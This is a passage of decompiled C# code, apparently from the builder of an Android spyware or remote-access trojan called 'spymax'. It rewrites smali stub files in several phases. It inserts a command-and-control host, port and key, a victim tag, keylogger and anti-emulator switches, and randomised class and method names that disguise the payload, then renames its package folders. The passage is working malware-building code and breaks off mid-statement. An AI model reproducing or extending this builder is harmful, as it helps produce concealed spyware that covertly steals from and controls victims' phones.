this.str7).Replace("k1k2k3k4k5k6", this.str8).Replace("o1o2o3o4o5o6", this.str9).Replace("u1u2u3u4u5u6", this.str10).Replace("e1e2e3e4e5e6", this.str11).Replace("y1y2y3y4y5y6", this.str12).Replace("b1b2b3b4b5b6", this.app0).Replace("suffix", this.string_42).Replace("d1d2d3d4d5d6", this.ico0).Replace("x1x2x3x4x5x6", this.ico1).Replace("q1q2q3q4q5q6", this.web0).Replace("s1s2s3s4s5s6", this.noti8).Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_69))).Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_35))).Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_36))).Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs").Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv").Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr").Replace("[CYPHER_VICTIM]", this.string_37).Replace("[TYPE-HIDE]", this.T).Replace("skin.info", this.string_25).Replace("USE-SUPER", this.string_3).Replace("[SS]", this.string_9).Replace("[RC]", this.string_10).Replace("[SW]", this.string_11).Replace("[RS]", this.string_12).Replace("[RCG]", this.string_13).Replace("[CRC]", this.string_14).Replace("[GA]", this.string_15).Replace("[CA]", this.string_16).Replace("[MC]", this.string_17).Replace("[LOC1]", this.string_18).Replace("[LOC2]", this.string_19).Replace("[LOC3]", this.string_20).Replace("[CL]", this.string_21).Replace("USE-QUICK", this.string_4).Replace("USE-DRAW", this.string_5).Replace("USE-NOTIFI", this.string_6).Replace("_isequel_mth_", "helpscanintnum").Replace("_exit_meth_", this.string_53).Replace("_wifipolc_meth_", this.string_54).Replace("_formtpakt_methd_", this.string_55).Replace("_DZIP_meth_", this.string_56).Replace("_Getbyte_meth_", this.string_57).Replace("_D_BASE64_", this.string_58).Replace("_getstr_meth_", this.string_59).Replace("_CZIP_meth_", this.string_60).Replace("_inst_bnd_", this.string_61).Replace("_strt_con_", this.string_62).Replace("[USE-REC]", this.string_34).Replace("_fist_inf_", this.string_63).Replace("_new_con_", this.string_64).Replace("trg.trgtapp.trg", this.string_33).Replace("_send_it_", this.string_65).Replace("_Reblace_", this.string_66).Replace("_runn_srv_", this.string_67).Replace("[off_keylog]", this.string_27).Replace("[NO_EMUALTOR]", this.string_28).Replace("_NOTIFI_TITLE_", this.string_31).Replace("_NOTIFI_MSG_", this.string_30).Replace("_randomS_shit_", Conversions.ToString(this.method_16(100, 200))).Replace("[RANDOM-STRING]", this.string_68).Replace("[CYPHER_FUT3EX]", "aEVAERgaergaergasvargAA==");
											}
											File.WriteAllText(fileInfo.FullName, text12);
										}
										break;
									}
									Thread.Sleep(this.int_1);
								}
								catch (Exception ex6)
								{
									Thread.Sleep(this.int_1);
								}
							}
							for (;;)
							{
								try
								{
									string path12 = this.string_44 + "\\temp\\smali\\spymax\\stub7\\activz";
									if (Directory.Exists(path12))
									{
										DirectoryInfo directoryInfo2 = new DirectoryInfo(path12);
										FileInfo[] files2 = directoryInfo2.GetFiles("*.smali");
										this.method_30("Phase 2\r\n---------");
										foreach (FileInfo fileInfo2 in files2)
										{
											string text13 = File.ReadAllText(fileInfo2.FullName);
											if (Operators.CompareString(fileInfo2.Name.ToLower(), "buildconfig.smali", false) == 0)
											{
												text13 = text13.Replace("payload", this.payload).Replace("suffix", this.string_42).Replace("spymax", this.package).Replace("stub7", this.name).Replace("j1j2j3j4j5j6", this.string_47).Replace("c1c2c3c4c5c6", this.string_48).Replace("z1z2z3z4z5z6", this.string_49).Replace("f1f2f3f4f5f6", this.string_50).Replace("h1h2h3h4h5h6", this.string_51).Replace("t1t2t3t4t5t6", this.string_52).Replace("n1n2n3n4n5n6", this.str6).Replace("i1i2i3i4i5i6", this.str7).Replace("activz", this.activz).Replace("servziz", this.servziz).Replace("tolziz", this.tolziz).Replace("brodatz", this.brodatz).Replace("k1k2k3k4k5k6", this.str8).Replace("o1o2o3o4o5o6", this.str9).Replace("u1u2u3u4u5u6", this.str10).Replace("e1e2e3e4e5e6", this.str11).Replace("y1y2y3y4y5y6", this.str12).Replace("b1b2b3b4b5b6", this.app0).Replace("d1d2d3d4d5d6", this.ico0).Replace("x1x2x3x4x5x6", this.ico1).Replace("q1q2q3q4q5q6", this.web0).Replace("s1s2s3s4s5s6", this.noti8);
											}
											else
											{
												text13 = text13.Replace("spymax", this.package).Replace("stub7", this.name).Replace("ClassGen0", this.QQ0).Replace("ClassGen1", this.QQ1).Replace("ClassGen2", this.QQ2).Replace("ClassGen3", this.QQ3).Replace("ClassGen4", this.QQ4).Replace("ClassGen5", this.QQ5).Replace("ClassGen6", this.QQ6).Replace("ClassGen8", this.QQ8).Replace("ClassGen9", this.QQ9).Replace("activz", this.activz).Replace("servziz", this.servziz).Replace("tolziz", this.tolziz).Replace("brodatz", this.brodatz).Replace("ClassGen10", this.QQ10).Replace("ClassGen11", this.QQ11).Replace("ClassGen12", this.QQ12).Replace("ClassGen13", this.QQ13).Replace("ClassGen14", this.QQ14).Replace("_ask_battary_", this._ask_battary_).Replace("_ask_draw_", this._ask_draw_).Replace("_sc_fb_", this._sc_fb_).Replace("_news_g_", this._news_g_).Replace("_strt_view_", this._strt_view_).Replace("_scctrl_", this._scctrl_).Replace("_access_ask_", this._access_ask_).Replace("_cap_sc_", this._cap_sc_).Replace("_trns_g_", this._trns_g_).Replace("_ask_prim_", this._ask_prim_).Replace("_engine_wrk_", this._engine_wrk_).Replace("_skin_cls_", this._skin_cls_).Replace("_update_app_", this._update_app_).Replace("_callr_lsnr_", this._callr_lsnr_).Replace("_clss_loder_", this._clss_loder_).Replace("_excut_meth_", this._excut_meth_).Replace("_run_comnd_", this._run_comnd_).Replace("_get_me_fil_", this._get_me_fil_).Replace("_srv_worker_", this._srv_worker_).Replace("j1j2j3j4j5j6", this.string_47).Replace("c1c2c3c4c5c6", this.string_48).Replace("z1z2z3z4z5z6", this.string_49).Replace("f1f2f3f4f5f6", this.string_50).Replace("h1h2h3h4h5h6", this.string_51).Replace("t1t2t3t4t5t6", this.string_52).Replace("n1n2n3n4n5n6", this.str6).Replace("i1i2i3i4i5i6", this.str7).Replace("k1k2k3k4k5k6", this.str8).Replace("o1o2o3o4o5o6", this.str9).Replace("u1u2u3u4u5u6", this.str10).Replace("e1e2e3e4e5e6", this.str11).Replace("y1y2y3y4y5y6", this.str12).Replace("b1b2b3b4b5b6", this.app0).Replace("suffix", this.string_42).Replace("d1d2d3d4d5d6", this.ico0).Replace("x1x2x3x4x5x6", this.ico1).Replace("q1q2q3q4q5q6", this.web0).Replace("s1s2s3s4s5s6", this.noti8).Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_69))).Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_35))).Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_36))).Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs").Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv").Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr").Replace("[CYPHER_VICTIM]", this.string_37).Replace("[TYPE-HIDE]", this.T).Replace("skin.info", this.string_25).Replace("USE-SUPER", this.string_3).Replace("[SS]", this.string_9).Replace("[RC]", this.string_10).Replace("[SW]", this.string_11).Replace("[RS]", this.string_12).Replace("[RCG]", this.string_13).Replace("[CRC]", this.string_14).Replace("[GA]", this.string_15).Replace("[CA]", this.string_16).Replace("[MC]", this.string_17).Replace("[LOC1]", this.string_18).Replace("[LOC2]", this.string_19).Replace("[LOC3]", this.string_20).Replace("[CL]", this.string_21).Replace("USE-QUICK", this.string_4).Replace("USE-DRAW", this.string_5).Replace("USE-NOTIFI", this.string_6).Replace("_isequel_mth_", "helpscanintnum").Replace("_exit_meth_", this.string_53).Replace("_wifipolc_meth_", this.string_54).Replace("_formtpakt_methd_", this.string_55).Replace("_DZIP_meth_", this.string_56).Replace("_Getbyte_meth_", this.string_57).Replace("_D_BASE64_", this.string_58).Replace("_getstr_meth_", this.string_59).Replace("_CZIP_meth_", this.string_60).Replace("_inst_bnd_", this.string_61).Replace("_strt_con_", this.string_62).Replace("[USE-REC]", this.string_34).Replace("_fist_inf_", this.string_63).Replace("_new_con_", this.string_64).Replace("trg.trgtapp.trg", this.string_33).Replace("_send_it_", this.string_65).Replace("_Reblace_", this.string_66).Replace("_runn_srv_", this.string_67).Replace("[off_keylog]", this.string_27).Replace("[NO_EMUALTOR]", this.string_28).Replace("_NOTIFI_TITLE_", this.string_31).Replace("_NOTIFI_MSG_", this.string_30).Replace("_randomS_shit_", Conversions.ToString(this.method_16(100, 200))).Replace("[RANDOM-STRING]", this.string_68).Replace("[CYPHER_FUT3EX]", "aEVAERgaergaergasvargAA==");
											}
											File.WriteAllText(fileInfo2.FullName, text13);
										}
										break;
									}
									Thread.Sleep(this.int_1);
								}
								catch (Exception ex7)
								{
									Thread.Sleep(this.int_1);
								}
							}
							for (;;)
							{
								try
								{
									string path13 = this.string_44 + "\\temp\\smali\\spymax\\stub7\\activz\\brodatz";
									if (Directory.Exists(path13))
									{
										DirectoryInfo directoryInfo3 = new DirectoryInfo(path13);
										FileInfo[] files3 = directoryInfo3.GetFiles("*.smali");
										this.method_30("Phase 3\r\n---------");
										foreach (FileInfo fileInfo3 in files3)
										{
											string text14 = File.ReadAllText(fileInfo3.FullName);
											if (Operators.CompareString(fileInfo3.Name.ToLower(), "buildconfig.smali", false) != 0)
											{
												text14 = text14.Replace("spymax", this.package).Replace("stub7", this.name).Replace("ClassGen0", this.QQ0).Replace("ClassGen1", this.QQ1).Replace("ClassGen2", this.QQ2).Replace("ClassGen3", this.QQ3).Replace("ClassGen4", this.QQ4).Replace("ClassGen5", this.QQ5).Replace("ClassGen6", this.QQ6).Replace("ClassGen8", this.QQ8).Replace("ClassGen9", this.QQ9).Replace("ClassGen10", this.QQ10).Replace("ClassGen11", this.QQ11).Replace("ClassGen12", this.QQ12).Replace("ClassGen13", this.QQ13).Replace("ClassGen14", this.QQ14).Replace("activz", this.activz).Replace("servziz", this.servziz).Replace("tolziz", this.tolziz).Replace("brodatz", this.brodatz).Replace("_ask_battary_", this._ask_battary_).Replace("_ask_draw_", this._ask_draw_).Replace("_sc_fb_", this._sc_fb_).Replace("_news_g_", this._news_g_).Replace("_strt_view_", this._strt_view_).Replace("_scctrl_", this._scctrl_).Replace("_access_ask_", this._access_ask_).Replace("_cap_sc_", this._cap_sc_).Replace("_trns_g_", this._trns_g_).Replace("_ask_prim_", this._ask_prim_).Replace("_engine_wrk_", this._engine_wrk_).Replace("_skin_cls_", this._skin_cls_).Replace("_update_app_", this._update_app_).Replace("_callr_lsnr_", this._callr_lsnr_).Replace("_clss_loder_", this._clss_loder_).Replace("_excut_meth_", this._excut_meth_).Replace("_run_comnd_", this._run_comnd_).Replace("_get_me_fil_", this._get_me_fil_).Replace("_srv_worker_", this._srv_worker_).Replace("j1j2j3j4j5j6", this.string_47).Replace("c1c2c3c4c5c6", this.string_48).Replace("z1z2z3z4z5z6", this.string_49).Replace("f1f2f3f4f5f6", this.string_50).Replace("h1h2h3h4h5h6", this.string_51).Replace("t1t2t3t4t5t6", this.string_52).Replace("n1n2n3n4n5n6", this.str6).Replace("i1i2i3i4i5i6", this.str7).Replace("k1k2k3k4k5k6", this.str8).Replace("o1o2o3o4o5o6", this.str9).Replace("u1u2u3u4u5u6", this.str10).Replace("e1e2e3e4e5e6", this.str11).Replace("y1y2y3y4y5y6", this.str12).Replace("b1b2b3b4b5b6", this.app0).Replace("suffix", this.string_42).Replace("d1d2d3d4d5d6", this.ico0).Replace("x1x2x3x4x5x6", this.ico1).Replace("q1q2q3q4q5q6", this.web0).Replace("s1s2s3s4s5s6", this.noti8).Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_69))).Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_35))).Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_36))).Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs").Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv").Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr").Replace("[CYPHER_VICTIM]", this.string_37).Replace("[TYPE-HIDE]", this.T).Replace("skin.info", this.string_25).Replace("USE-SUPER", this.string_3).Replace("[SS]", this.string_9).Replace("[RC]", this.string_10).Replace("[SW]", this.string_11).Replace("[RS]", this.string_12).Replace("[RCG]", this.string_13).Replace("[CRC]", this.string_14).Replace("[GA]", this.string_15).Replace("[CA]", this.string_16).Replace("[MC]", this.string_17).Replace("[LOC1]", this.string_18).Replace("[LOC2]", this.string_19).Replace("[LOC3]", this.string_20).Replace("[CL]", this.string_21).Replace("USE-QUICK", this.string_4).Replace("USE-DRAW", this.string_5).Replace("USE-NOTIFI", this.string_6).Replace("_isequel_mth_", "helpscanintnum").Replace("_exit_meth_", this.string_53).Replace("_wifipolc_meth_", this.string_54).Replace("_formtpakt_methd_", this.string_55).Replace("_DZIP_meth_", this.string_56).Replace("_Getbyte_meth_", this.string_57).Replace("_D_BASE64_", this.string_58).Replace("_getstr_meth_", this.string_59).Replace("_CZIP_meth_", this.string_60).Replace("_inst_bnd_", this.string_61).Replace("_strt_con_", this.string_62).Replace("[USE-REC]", this.string_34).Replace("_fist_inf_", this.string_63).Replace("_new_con_", this.string_64).Replace("trg.trgtapp.trg", this.string_33).Replace("_send_it_", this.string_65).Replace("_Reblace_", this.string_66).Replace("_runn_srv_", this.string_67).Replace("[off_keylog]", this.string_27).Replace("[NO_EMUALTOR]", this.string_28).Replace("_NOTIFI_TITLE_", this.string_31).Replace("_NOTIFI_MSG_", this.string_30).Replace("_randomS_shit_", Conversions.ToString(this.method_16(100, 200))).Replace("[RANDOM-STRING]", this.string_68).Replace("[CYPHER_FUT3EX]", "aEVAERgaergaergasvargAA==");
											}
											else
											{
												text14 = text14.Replace("payload", this.payload).Replace("suffix", this.string_42).Replace("spymax", this.package).Replace("stub7", this.name).Replace("j1j2j3j4j5j6", this.string_47).Replace("c1c2c3c4c5c6", this.string_48).Replace("z1z2z3z4z5z6", this.string_49).Replace("f1f2f3f4f5f6", this.string_50).Replace("h1h2h3h4h5h6", this.string_51).Replace("t1t2t3t4t5t6", this.string_52).Replace("n1n2n3n4n5n6", this.str6).Replace("i1i2i3i4i5i6", this.str7).Replace("k1k2k3k4k5k6", this.str8).Replace("o1o2o3o4o5o6", this.str9).Replace("u1u2u3u4u5u6", this.str10).Replace("e1e2e3e4e5e6", this.str11).Replace("y1y2y3y4y5y6", this.str12).Replace("b1b2b3b4b5b6", this.app0).Replace("d1d2d3d4d5d6", this.ico0).Replace("x1x2x3x4x5x6", this.ico1).Replace("q1q2q3q4q5q6", this.web0).Replace("s1s2s3s4s5s6", this.noti8);
											}
											File.WriteAllText(fileInfo3.FullName, text14);
										}
										break;
									}
									Thread.Sleep(this.int_1);
								}
								catch (Exception ex8)
								{
									Thread.Sleep(this.int_1);
								}
							}
							for (;;)
							{
								try
								{
									string path14 = this.string_44 + "\\temp\\smali\\spymax\\stub7\\activz\\servziz";
									if (Directory.Exists(path14))
									{
										DirectoryInfo directoryInfo4 = new DirectoryInfo(path14);
										FileInfo[] files4 = directoryInfo4.GetFiles("*.smali");
										this.method_30("Phase 4\r\n---------");
										foreach (FileInfo fileInfo4 in files4)
										{
											string text15 = File.ReadAllText(fileInfo4.FullName);
											if (Operators.CompareString(fileInfo4.Name.ToLower(), "buildconfig.smali", false) != 0)
											{
												text15 = text15.Replace("spymax", this.package).Replace("stub7", this.name).Replace("ClassGen0", this.QQ0).Replace("ClassGen1", this.QQ1).Replace("ClassGen2", this.QQ2).Replace("ClassGen3", this.QQ3).Replace("ClassGen4", this.QQ4).Replace("ClassGen5", this.QQ5).Replace("ClassGen6", this.QQ6).Replace("ClassGen8", this.QQ8).Replace("ClassGen9", this.QQ9).Replace("ClassGen10", this.QQ10).Replace("ClassGen11", this.QQ11).Replace("ClassGen12", this.QQ12).Replace("ClassGen13", this.QQ13).Replace("ClassGen14", this.QQ14).Replace("activz", this.activz).Replace("servziz", this.servziz).Replace("tolziz", this.tolziz).Replace("brodatz", this.brodatz).Replace("_ask_battary_", this._ask_battary_).Replace("_ask_draw_", this._ask_draw_).Replace("_sc_fb_", this._sc_fb_).Replace("_news_g_", this._news_g_).Replace("_strt_view_", this._strt_view_).Replace("_scctrl_", this._scctrl_).Replace("_access_ask_", this._access_ask_).Replace("_cap_sc_", this._cap_sc_).Replace("_trns_g_", this._trns_g_).Replace("_ask_prim_", this._ask_prim_).Replace("_engine_wrk_", this._engine_wrk_).Replace("_skin_cls_", this._skin_cls_).Replace("_update_app_", this._update_app_).Replace("_callr_lsnr_", this._callr_lsnr_).Replace("_clss_loder_", this._clss_loder_).Replace("_excut_meth_", this._excut_meth_).Replace("_run_comnd_", this._run_comnd_).Replace("_get_me_fil_", this._get_me_fil_).Replace("_srv_worker_", this._srv_worker_).Replace("j1j2j3j4j5j6", this.string_47).Replace("c1c2c3c4c5c6", this.string_48).Replace("z1z2z3z4z5z6", this.string_49).Replace("f1f2f3f4f5f6", this.string_50).Replace("h1h2h3h4h5h6", this.string_51).Replace("t1t2t3t4t5t6", this.string_52).Replace("n1n2n3n4n5n6", this.str6).Replace("i1i2i3i4i5i6", this.str7).Replace("k1k2k3k4k5k6", this.str8).Replace("o1o2o3o4o5o6", this.str9).Replace("u1u2u3u4u5u6", this.str10).Replace("e1e2e3e4e5e6", this.str11).Replace("y1y2y3y4y5y6", this.str12).Replace("b1b2b3b4b5b6", this.app0).Replace("suffix", this.string_42).Replace("d1d2d3d4d5d6", this.ico0).Replace("x1x2x3x4x5x6", this.ico1).Replace("q1q2q3q4q5q6", this.web0).Replace("s1s2s3s4s5s6", this.noti8).Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_69))).Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_35))).Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_36))).Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs").Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv").Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr").Replace("[CYPHER_VICTIM]", this.string_37).Replace("[TYPE-HIDE]", this.T).Replace("skin.info", this.string_25).Replace("USE-SUPER", this.string_3).Replace("[SS]", this.string_9).Replace("[RC]", this.string_10).Replace("[SW]", this.string_11).Replace("[RS]", this.string_12).Replace("[RCG]", this.string_13).Replace("[CRC]", this.string_14).Replace("[GA]", this.string_15).Replace("[CA]", this.string_16).Replace("[MC]", this.string_17).Replace("[LOC1]", this.string_18).Replace("[LOC2]", this.string_19).Replace("[LOC3]", this.string_20).Replace("[CL]", this.string_21).Replace("USE-QUICK", this.string_4).Replace("USE-DRAW", this.string_5).Replace("USE-NOTIFI", this.string_6).Replace("_isequel_mth_", "helpscanintnum").Replace("_exit_meth_", this.string_53).Replace("_wifipolc_meth_", this.string_54).Replace("_formtpakt_methd_", this.string_55).Replace("_DZIP_meth_", this.string_56).Replace("_Getbyte_meth_", this.string_57).Replace("_D_BASE64_", this.string_58).Replace("_getstr_meth_", this.string_59).Replace("_CZIP_meth_", this.string_60).Replace("_inst_bnd_", this.string_61).Replace("_strt_con_", this.string_62).Replace("[USE-REC]", this.string_34).Replace("_fist_inf_", this.string_63).Replace("_new_con_", this.string_64).Replace("trg.trgtapp.trg", this.string_33).Replace("_send_it_", this.string_65).Replace("_Reblace_", this.string_66).Replace("_runn_srv_", this.string_67).Replace("[off_keylog]", this.string_27).Replace("[NO_EMUALTOR]", this.string_28).Replace("_NOTIFI_TITLE_", this.string_31).Replace("_NOTIFI_MSG_", this.string_30).Replace("_randomS_shit_", Conversions.ToString(this.method_16(100, 200))).Replace("[RANDOM-STRING]", this.string_68).Replace("[CYPHER_FUT3EX]", "aEVAERgaergaergasvargAA==");
											}
											else
											{
												text15 = text15.Replace("payload", this.payload).Replace("suffix", this.string_42).Replace("spymax", this.package).Replace("stub7", this.name).Replace("j1j2j3j4j5j6", this.string_47).Replace("c1c2c3c4c5c6", this.string_48).Replace("z1z2z3z4z5z6", this.string_49).Replace("f1f2f3f4f5f6", this.string_50).Replace("h1h2h3h4h5h6", this.string_51).Replace("t1t2t3t4t5t6", this.string_52).Replace("n1n2n3n4n5n6", this.str6).Replace("i1i2i3i4i5i6", this.str7).Replace("k1k2k3k4k5k6", this.str8).Replace("o1o2o3o4o5o6", this.str9).Replace("u1u2u3u4u5u6", this.str10).Replace("e1e2e3e4e5e6", this.str11).Replace("y1y2y3y4y5y6", this.str12).Replace("b1b2b3b4b5b6", this.app0).Replace("d1d2d3d4d5d6", this.ico0).Replace("x1x2x3x4x5x6", this.ico1).Replace("q1q2q3q4q5q6", this.web0).Replace("s1s2s3s4s5s6", this.noti8);
											}
											File.WriteAllText(fileInfo4.FullName, text15);
										}
										break;
									}
									Thread.Sleep(this.int_1);
								}
								catch (Exception ex9)
								{
									Thread.Sleep(this.int_1);
								}
							}
							for (;;)
							{
								try
								{
									string path15 = this.string_44 + "\\temp\\smali\\spymax\\stub7\\activz\\tolziz";
									if (Directory.Exists(path15))
									{
										DirectoryInfo directoryInfo5 = new DirectoryInfo(path15);
										FileInfo[] files5 = directoryInfo5.GetFiles("*.smali");
										this.method_30("Phase 5\r\n---------");
										foreach (FileInfo fileInfo5 in files5)
										{
											string text16 = File.ReadAllText(fileInfo5.FullName);
											if (Operators.CompareString(fileInfo5.Name.ToLower(), "buildconfig.smali", false) == 0)
											{
												text16 = text16.Replace("payload", this.payload).Replace("suffix", this.string_42).Replace("spymax", this.package).Replace("stub7", this.name).Replace("j1j2j3j4j5j6", this.string_47).Replace("c1c2c3c4c5c6", this.string_48).Replace("z1z2z3z4z5z6", this.string_49).Replace("f1f2f3f4f5f6", this.string_50).Replace("h1h2h3h4h5h6", this.string_51).Replace("t1t2t3t4t5t6", this.string_52).Replace("n1n2n3n4n5n6", this.str6).Replace("i1i2i3i4i5i6", this.str7).Replace("k1k2k3k4k5k6", this.str8).Replace("o1o2o3o4o5o6", this.str9).Replace("u1u2u3u4u5u6", this.str10).Replace("e1e2e3e4e5e6", this.str11).Replace("y1y2y3y4y5y6", this.str12).Replace("b1b2b3b4b5b6", this.app0).Replace("d1d2d3d4d5d6", this.ico0).Replace("x1x2x3x4x5x6", this.ico1).Replace("q1q2q3q4q5q6", this.web0).Replace("s1s2s3s4s5s6", this.noti8);
											}
											else
											{
												text16 = text16.Replace("spymax", this.package).Replace("stub7", this.name).Replace("ClassGen0", this.QQ0).Replace("ClassGen1", this.QQ1).Replace("ClassGen2", this.QQ2).Replace("ClassGen3", this.QQ3).Replace("ClassGen4", this.QQ4).Replace("ClassGen5", this.QQ5).Replace("ClassGen6", this.QQ6).Replace("ClassGen8", this.QQ8).Replace("ClassGen9", this.QQ9).Replace("ClassGen10", this.QQ10).Replace("ClassGen11", this.QQ11).Replace("ClassGen12", this.QQ12).Replace("ClassGen13", this.QQ13).Replace("ClassGen14", this.QQ14).Replace("activz", this.activz).Replace("servziz", this.servziz).Replace("tolziz", this.tolziz).Replace("brodatz", this.brodatz).Replace("_ask_battary_", this._ask_battary_).Replace("_ask_draw_", this._ask_draw_).Replace("_sc_fb_", this._sc_fb_).Replace("_news_g_", this._news_g_).Replace("_strt_view_", this._strt_view_).Replace("_scctrl_", this._scctrl_).Replace("_access_ask_", this._access_ask_).Replace("_cap_sc_", this._cap_sc_).Replace("_trns_g_", this._trns_g_).Replace("_ask_prim_", this._ask_prim_).Replace("_engine_wrk_", this._engine_wrk_).Replace("_skin_cls_", this._skin_cls_).Replace("_update_app_", this._update_app_).Replace("_callr_lsnr_", this._callr_lsnr_).Replace("_clss_loder_", this._clss_loder_).Replace("_excut_meth_", this._excut_meth_).Replace("_run_comnd_", this._run_comnd_).Replace("_get_me_fil_", this._get_me_fil_).Replace("_srv_worker_", this._srv_worker_).Replace("j1j2j3j4j5j6", this.string_47).Replace("c1c2c3c4c5c6", this.string_48).Replace("z1z2z3z4z5z6", this.string_49).Replace("f1f2f3f4f5f6", this.string_50).Replace("h1h2h3h4h5h6", this.string_51).Replace("t1t2t3t4t5t6", this.string_52).Replace("n1n2n3n4n5n6", this.str6).Replace("i1i2i3i4i5i6", this.str7).Replace("k1k2k3k4k5k6", this.str8).Replace("o1o2o3o4o5o6", this.str9).Replace("u1u2u3u4u5u6", this.str10).Replace("e1e2e3e4e5e6", this.str11).Replace("y1y2y3y4y5y6", this.str12).Replace("b1b2b3b4b5b6", this.app0).Replace("suffix", this.string_42).Replace("d1d2d3d4d5d6", this.ico0).Replace("x1x2x3x4x5x6", this.ico1).Replace("q1q2q3q4q5q6", this.web0).Replace("s1s2s3s4s5s6", this.noti8).Replace("key.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_69))).Replace("host.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_35))).Replace("port.info", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_36))).Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs").Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv").Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr").Replace("[CYPHER_VICTIM]", this.string_37).Replace("[TYPE-HIDE]", this.T).Replace("skin.info", this.string_25).Replace("USE-SUPER", this.string_3).Replace("[SS]", this.string_9).Replace("[RC]", this.string_10).Replace("[SW]", this.string_11).Replace("[RS]", this.string_12).Replace("[RCG]", this.string_13).Replace("[CRC]", this.string_14).Replace("[GA]", this.string_15).Replace("[CA]", this.string_16).Replace("[MC]", this.string_17).Replace("[LOC1]", this.string_18).Replace("[LOC2]", this.string_19).Replace("[LOC3]", this.string_20).Replace("[CL]", this.string_21).Replace("USE-QUICK", this.string_4).Replace("USE-DRAW", this.string_5).Replace("USE-NOTIFI", this.string_6).Replace("_isequel_mth_", "helpscanintnum").Replace("_exit_meth_", this.string_53).Replace("_wifipolc_meth_", this.string_54).Replace("_formtpakt_methd_", this.string_55).Replace("_DZIP_meth_", this.string_56).Replace("_Getbyte_meth_", this.string_57).Replace("_D_BASE64_", this.string_58).Replace("_getstr_meth_", this.string_59).Replace("_CZIP_meth_", this.string_60).Replace("_inst_bnd_", this.string_61).Replace("_strt_con_", this.string_62).Replace("[USE-REC]", this.string_34).Replace("_fist_inf_", this.string_63).Replace("_new_con_", this.string_64).Replace("trg.trgtapp.trg", this.string_33).Replace("_send_it_", this.string_65).Replace("_Reblace_", this.string_66).Replace("_runn_srv_", this.string_67).Replace("[off_keylog]", this.string_27).Replace("[NO_EMUALTOR]", this.string_28).Replace("_NOTIFI_TITLE_", this.string_31).Replace("_NOTIFI_MSG_", this.string_30).Replace("_randomS_shit_", Conversions.ToString(this.method_16(100, 200))).Replace("[RANDOM-STRING]", this.string_68).Replace("[CYPHER_FUT3EX]", "aEVAERgaergaergasvargAA==");
											}
											File.WriteAllText(fileInfo5.FullName, text16);
										}
										break;
									}
									Thread.Sleep(this.int_1);
								}
								catch (Exception ex10)
								{
									Thread.Sleep(this.int_1);
								}
							}
							try
							{
								Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(this.string_44 + "\\temp\\smali\\spymax\\stub7\\activz\\servziz", this.servziz);
								Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(this.string_44 + "\\temp\\smali\\spymax\\stub7\\activz\\tolziz", this.tolziz);
								Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(this.string_44 + "\\temp\\smali\\spymax\\stub7\\activz\\brodatz", this.brodatz);
								Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(this.string_44 + "\\temp\\smali\\spymax\\stub7\\activz", this.activz);
								Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(this.string_44 + "\\temp\\smali\\spymax\\stub7", this.name);
								Microsoft.VisualBasic.FileIO.FileSystem.RenameDirectory(this.string_44 + "\\temp\\smali\\spymax", this.package);
							}
							catch (Exception ex11)
							{
								Interaction.MsgBox(ex11.Message, MsgBoxStyle.OkOnly, null);
								Console.WriteLine(ex11.Message);
							}
							try
							{
								IL_3F38:
								if (File.Exists(path5))
								{
									string contents6 = File.ReadAllText(path5).Replace("j1j2j3j4j5j6", this.string_47).Replace("c1c2c3c4c5c6", this.string_48).Replace("z1z2z3z4z5z6", this.string_49).Replace("CYPHER_PATCH", this.string_38).Replace("f1f2f3f4f5f6", this.string_50).Replace("h1h2h3h4h5h6", this.string_51).Replace("t1t2t3t4t5t6", this.string_52).Replace("n1n2n3n4n5n6", this.str6).Replace("i1i2i3i4i5i6", this.str7).Replace("k1k2k3k4k5k6", this.str8).Replace("o1o2o3o4o5o6", this.str9).Replace("u1u2u3u4u5u6", this.str10).Replace("e1e2e3e4e5e6", this.str11).Replace("y1y2y3y4y5y6", this.str12).Replace("b1b2b3b4b5b6", this.app0).Replace("d1d2d3d4d5d6", this.ico0).Replace("x1x2x3x4x5x6", this.ico1).Replace("q1q2q3q4q5q6", this.web0).Replace("s1s2s3s4s5s6", this.noti8);
									File.WriteAllText(path5, contents6);
									goto IL_4106;
								}
								Thread.Sleep(this.int_1);
							}
							catch (Exception ex12)
							{
								Thread.Sleep(this.int_1);
							}
							goto IL_40AE;
							for (;;)
							{
								IL_4106:
								try
								{
									if (File.Exists(text))
									{
